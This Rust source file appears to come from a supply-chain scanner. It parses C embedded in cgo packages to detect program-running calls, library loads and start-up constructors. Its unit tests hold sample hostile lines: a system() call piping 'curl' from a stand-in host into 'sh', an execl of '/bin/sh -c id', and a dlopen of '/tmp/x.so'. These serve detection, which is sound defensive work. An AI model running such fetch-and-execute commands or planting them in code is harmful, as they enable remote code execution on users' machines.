//! The C a cgo package compiles in, read for the programs it runs and the libraries it loads (0.1.9, G-1).
//!
//! A Go file that imports "C" has its preamble (the comment before the import) compiled as C, and so are the
//! package's `.c` files. A function marked `__attribute__((constructor))` (or put in `.init_array`, or `#pragma
//! init`) runs when the program starts; the rest runs when Go code calls it (`C.f()`). This reads C's calls that run
//! a program (`system`, `popen`, the `exec` family, `WinExec`, `ShellExecute`, `CreateProcess`) or load a library
//! (`dlopen`, `LoadLibrary`), with the strings they are given (adjacent literals joined, C's escapes read, a
//! `#define`d string's name read as the string), as the model's events. It is not a C parser: anything else is
//! skipped, and an argument it cannot read is unknown.

use crate::model::events::{self, CmdState, Ev};
use crate::model::val::{Val, UNKNOWN};
use crate::pystr::{self, u, PyStr};
use std::collections::HashMap;

/// What a C text does.
#[derive(Debug, Default)]
pub struct CRead {
    pub events: Vec<Ev>,
    /// It has a function that runs when the program starts.
    pub constructor: bool,
}

#[derive(Clone, Copy, PartialEq, Eq, Debug)]
enum T {
    Name,
    Str,
    Num,
    Punct,
}

#[derive(Clone, Copy, Debug)]
struct Tok {
    kind: T,
    start: usize,
    end: usize,
}

fn is_name_start(c: u32) -> bool {
    char::from_u32(c).is_some_and(|ch| ch.is_ascii_alphabetic() || ch == '_')
}

fn is_name_char(c: u32) -> bool {
    char::from_u32(c).is_some_and(|ch| ch.is_ascii_alphanumeric() || ch == '_')
}

/// C's tokens in `text[from..to]` (comments skipped; `#` lines are tokens too, so `#define` is read).
fn tokens(text: &[u32], from: usize, to: usize) -> Vec<Tok> {
    let to = to.min(text.len());
    let mut out = Vec::new();
    let mut k = from;
    let c = |ch: char| ch as u32;
    while k < to {
        let x = text[k];
        if x == c('/') && k + 1 < to && text[k + 1] == c('/') {
            while k < to && text[k] != 10 {
                k += 1;
            }
            continue;
        }
        if x == c('/') && k + 1 < to && text[k + 1] == c('*') {
            k += 2;
            while k + 1 < to && !(text[k] == c('*') && text[k + 1] == c('/')) {
                k += 1;
            }
            k = (k + 2).min(to);
            continue;
        }
        if char::from_u32(x).is_some_and(|ch| ch.is_whitespace()) {
            k += 1;
            continue;
        }
        if x == c('"') || x == c('\'') {
            let s = k;
            k += 1;
            while k < to && text[k] != x && text[k] != 10 {
                if text[k] == c('\\') {
                    k += 1;
                }
                k += 1;
            }
            k = (k + 1).min(to);
            out.push(Tok { kind: if x == c('"') { T::Str } else { T::Num }, start: s, end: k });
            continue;
        }
        // a string's prefix: L"…", u8"…"
        if is_name_start(x) {
            let s = k;
            while k < to && is_name_char(text[k]) {
                k += 1;
            }
            if k < to && text[k] == c('"') && matches!(pystr::to_string(&text[s..k]).as_str(), "L" | "u" | "U" | "u8") {
                continue; // (the literal is the next token)
            }
            out.push(Tok { kind: T::Name, start: s, end: k });
            continue;
        }
        if char::from_u32(x).is_some_and(|ch| ch.is_ascii_digit()) {
            let s = k;
            while k < to && is_name_char(text[k]) {
                k += 1;
            }
            out.push(Tok { kind: T::Num, start: s, end: k });
            continue;
        }
        out.push(Tok { kind: T::Punct, start: k, end: k + 1 });
        k += 1;
    }
    out
}

/// A C string literal's value (C's escapes read).
fn c_string(t: &[u32]) -> Option<PyStr> {
    if t.len() < 2 || t[0] != '"' as u32 || *t.last()? != '"' as u32 {
        return None;
    }
    let body = &t[1..t.len() - 1];
    let mut out = Vec::with_capacity(body.len());
    let mut k = 0;
    while k < body.len() {
        let x = body[k];
        if x != '\\' as u32 {
            out.push(x);
            k += 1;
            continue;
        }
        let y = char::from_u32(*body.get(k + 1)?)?;
        k += 2;
        match y {
            'n' => out.push(10),
            't' => out.push(9),
            'r' => out.push(13),
            '0'..='7' => {
                let mut v = y as u32 - '0' as u32;
                let mut n = 1;
                while n < 3 && k < body.len() && ('0' as u32..='7' as u32).contains(&body[k]) {
                    v = v * 8 + body[k] - '0' as u32;
                    k += 1;
                    n += 1;
                }
                out.push(v & 0xFF);
            }
            'x' => {
                let mut v = 0u32;
                while k < body.len() && char::from_u32(body[k]).is_some_and(|ch| ch.is_ascii_hexdigit()) {
                    v = (v.wrapping_mul(16) + char::from_u32(body[k]).and_then(|ch| ch.to_digit(16)).unwrap_or(0)) & 0xFF;
                    k += 1;
                }
                out.push(v);
            }
            '\n' => {}
            other => out.push(other as u32),
        }
    }
    Some(crate::model::val::utf8(&out))
}

/// An argument's value: string literals joined, or a `#define`d string's name; else unknown.
fn arg_value(text: &[u32], toks: &[Tok], defines: &HashMap<PyStr, PyStr>) -> Val {
    let mut s: PyStr = Vec::new();
    let mut any = false;
    for t in toks {
        match t.kind {
            T::Str => match c_string(&text[t.start..t.end]) {
                Some(v) => {
                    s.extend(v);
                    any = true;
                }
                None => s.push(UNKNOWN),
            },
            T::Name => match defines.get(&text[t.start..t.end].to_vec()) {
                Some(v) => {
                    s.extend(v.iter().copied());
                    any = true;
                }
                None => return Val::unknown(),
            },
            // a cast before the string, `(char *)`
            T::Punct if matches!(char::from_u32(text[t.start]), Some('(' | ')' | '*')) => {}
            _ => return Val::unknown(),
        }
    }
    if any {
        Val::text(s)
    } else {
        Val::unknown()
    }
}

/// Is the argument `NULL` or `0` (the end of `execl`'s list)?
fn is_null(text: &[u32], toks: &[Tok]) -> bool {
    let words: Vec<String> = toks.iter().filter(|t| t.kind != T::Punct).map(|t| pystr::to_string(&text[t.start..t.end])).collect();
    words.last().is_some_and(|w| w == "NULL" || w == "0" || w == "nullptr")
}

/// What the C in `text[from..to]` runs and loads: its events, in the file `file`.
pub fn read_c(text: &[u32], from: usize, to: usize, file: u16) -> CRead {
    let toks = tokens(text, from, to);
    let mut out = CRead::default();
    let word = |t: &Tok| -> String { pystr::to_string(&text[t.start..t.end]) };
    let punct = |k: usize, ch: char| toks.get(k).is_some_and(|t| t.kind == T::Punct && text[t.start] == ch as u32);
    // `#define NAME "string"`
    let mut defines: HashMap<PyStr, PyStr> = HashMap::new();
    for k in 0..toks.len() {
        if punct(k, '#') && toks.get(k + 1).is_some_and(|t| word(t) == "define") {
            if let (Some(n), Some(v)) = (toks.get(k + 2), toks.get(k + 3)) {
                if n.kind == T::Name && v.kind == T::Str && text[n.end..v.start].iter().all(|&c| c != 10) {
                    if let Some(s) = c_string(&text[v.start..v.end]) {
                        defines.insert(text[n.start..n.end].to_vec(), s);
                    }
                }
            }
        }
        // a function that runs at start
        if toks[k].kind == T::Name {
            let w = word(&toks[k]);
            if w == "constructor" || w == "__constructor__" {
                if (1..=3).any(|b| k >= b && toks[k - b].kind == T::Name && word(&toks[k - b]) == "__attribute__") {
                    out.constructor = true;
                }
            }
            if (w == "pragma" && toks.get(k + 1).is_some_and(|t| word(t) == "init")) || w == "init_array" || w == "CRT$XCU" {
                out.constructor = true;
            }
        }
        if toks[k].kind == T::Str {
            let s = pystr::to_string(&text[toks[k].start..toks[k].end]);
            if s.contains(".init_array") || s.contains(".CRT$XCU") || s.contains(".ctors") {
                out.constructor = true;
            }
        }
    }
    let mut k = 0;
    while k < toks.len() {
        let t = toks[k];
        if t.kind != T::Name || !punct(k + 1, '(') {
            k += 1;
            continue;
        }
        let name = word(&t);
        // the arguments: the tokens to the matching `)`, split at the commas of this level
        let mut args: Vec<Vec<Tok>> = vec![Vec::new()];
        let mut depth = 0i32;
        let mut j = k + 1;
        while j < toks.len() {
            let x = toks[j];
            if x.kind == T::Punct {
                let ch = text[x.start];
                if ch == '(' as u32 {
                    depth += 1;
                    if depth == 1 {
                        j += 1;
                        continue;
                    }
                } else if ch == ')' as u32 {
                    depth -= 1;
                    if depth == 0 {
                        break;
                    }
                } else if ch == ',' as u32 && depth == 1 {
                    args.push(Vec::new());
                    j += 1;
                    continue;
                }
            }
            if let Some(last) = args.last_mut() {
                last.push(x);
            }
            j += 1;
        }
        let at = t.start as u32;
        let val = |i: usize| args.get(i).map(|a| arg_value(text, a, &defines)).unwrap_or_default();
        let mut cmd: Option<(Val, Vec<Val>)> = None;
        match name.as_str() {
            "system" | "popen" | "_popen" | "_wsystem" => cmd = Some((Val::text(u("sh")), vec![Val::text(u("-c")), val(0)])),
            "WinExec" => cmd = Some((Val::text(u("cmd")), vec![Val::text(u("/c")), val(0)])),
            "execl" | "execlp" | "execle" => {
                let mut rest = Vec::new();
                for (i, a) in args.iter().enumerate().skip(2) {
                    if is_null(text, a) {
                        break;
                    }
                    let _ = i;
                    rest.push(arg_value(text, a, &defines));
                }
                cmd = Some((val(0), rest));
            }
            "execv" | "execvp" | "execve" | "execvpe" | "posix_spawn" | "posix_spawnp" => {
                let prog = if name.starts_with("posix_spawn") { val(1) } else { val(0) };
                cmd = Some((prog, vec![Val::unknown()]));
            }
            "ShellExecuteA" | "ShellExecuteW" | "ShellExecute" => cmd = Some((val(2), vec![val(3)])),
            "CreateProcessA" | "CreateProcessW" | "CreateProcess" => {
                let app = val(0);
                let line = val(1);
                cmd = Some(if app.s.is_some() { (app, vec![line]) } else { (Val::text(u("cmd")), vec![Val::text(u("/c")), line]) });
            }
            "dlopen" | "LoadLibraryA" | "LoadLibraryW" | "LoadLibrary" | "LoadLibraryExA" | "LoadLibraryExW" => {
                out.events.push(Ev::Load { file, at, path: val(0) });
            }
            _ => {}
        }
        if let Some((prog, args)) = cmd {
            let st = CmdState { prog, args, file, at, ..CmdState::default() };
            out.events.extend(events::run_events(&st));
        }
        k += 1;
    }
    out
}

/// The text of a cgo preamble as C: its comments' contents where they are, everything else blanked (line breaks
/// kept, so offsets are the Go file's). `comments` are the file's comment spans; the preamble is `[from, to)`.
pub fn preamble_view(text: &[u32], comments: &[(usize, usize)], from: usize, to: usize) -> PyStr {
    let mut out: PyStr = text.iter().map(|&c| if c == 10 { 10 } else { ' ' as u32 }).collect();
    for &(cs, ce) in comments {
        if ce <= from || cs >= to {
            continue;
        }
        let (s, e) = if text.get(cs + 1) == Some(&('/' as u32)) {
            (cs + 2, ce)
        } else {
            (cs + 2, ce.saturating_sub(2).max(cs + 2))
        };
        for k in s..e.min(text.len()) {
            out[k] = text[k];
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn u32s(s: &str) -> Vec<u32> {
        s.chars().map(|c| c as u32).collect()
    }

    fn lines(r: &CRead) -> Vec<String> {
        r.events
            .iter()
            .filter_map(|e| match e {
                Ev::Run { line, .. } => Some(line.iter().map(|&c| char::from_u32(c).unwrap_or('?')).collect()),
                Ev::Load { path, .. } => Some(format!("load {}", path.text_or_unknown().iter().map(|&c| char::from_u32(c).unwrap_or('?')).collect::<String>())),
                _ => None,
            })
            .collect()
    }

    #[test]
    fn calls_that_run_a_program() {
        let src = u32s(
            "#define URL \"https://example.invalid/s\"\nstatic void f(void) { system(\"curl -s \" URL \" | sh\"); }\n\
             void g(void) { execl(\"/bin/sh\", \"sh\", \"-c\", \"id\", (char *)NULL); }\nvoid h(void) { void *p = dlopen(\"/tmp/x.so\", 2); }\n",
        );
        let r = read_c(&src, 0, src.len(), 0);
        // (a script's commands are runs of their own too)
        assert_eq!(lines(&r), vec!["curl -s https://example.invalid/s | sh", "curl -s https://example.invalid/s", "sh", "id", "load /tmp/x.so"]);
        assert!(!r.constructor);
    }

    #[test]
    fn a_constructor_runs_at_start() {
        let src = u32s("__attribute__((constructor)) static void init(void) { system(\"id\"); }\n");
        assert!(read_c(&src, 0, src.len(), 0).constructor);
        let src = u32s("static void init(void) __attribute__ ((constructor(101)));\n");
        assert!(read_c(&src, 0, src.len(), 0).constructor);
        let src = u32s("static void (*p)(void) __attribute__((section(\".init_array\"))) = f;\n");
        assert!(read_c(&src, 0, src.len(), 0).constructor);
        let src = u32s("int constructor = 1; void f(void) { printf(\"constructor\"); }\n");
        assert!(!read_c(&src, 0, src.len(), 0).constructor);
    }

    #[test]
    fn a_preamble_is_its_comments_contents() {
        let src = u32s("package p\n\n// #include <stdlib.h>\n// static void f(void) { system(\"id\"); }\nimport \"C\"\n");
        let comments = crate::lex::structure(&src, "go", false).expect("go").comments;
        let from = 11;
        let to = src.len();
        let v = preamble_view(&src, &comments, from, to);
        let text: String = v.iter().map(|&c| char::from_u32(c).unwrap_or('?')).collect();
        assert!(text.contains(" #include <stdlib.h>"));
        assert!(!text.contains("import"));
        assert!(!text.contains("//"));
        let r = read_c(&v, 0, v.len(), 0);
        assert_eq!(lines(&r), vec!["id"]);
    }
}
